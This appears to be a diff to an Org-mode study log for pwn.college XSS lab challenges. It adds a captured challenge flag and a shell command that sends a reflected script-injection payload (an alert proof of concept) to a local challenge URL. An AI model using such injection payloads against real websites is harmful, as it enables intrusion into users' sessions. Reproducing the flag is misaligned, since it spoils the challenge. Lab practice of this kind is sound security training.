@@ -353,6 +353,15 @@ CLOSED: [2026-06-18 木 13:53]
   #+end_comment
 :END:
 ** TODO XSS 3
+:LOGBOOK:
+- Note taken on [2026-06-19 金 23:47] \\
+  #+begin_comment
+  pwn.college{8X_UMqglPKztZq1VjyQ-S3kjpcT.dRTOzMDL2AjNyMzW}
+  #+end_comment
+:END:
+#+begin_src shell
+/challenge/victim 'http://challenge.localhost/?msg=<script>alert("PWNED")</script>'
+#+end_src
 ** TODO XSS 4
 ** TODO XSS 5
 ** TODO XSS 6
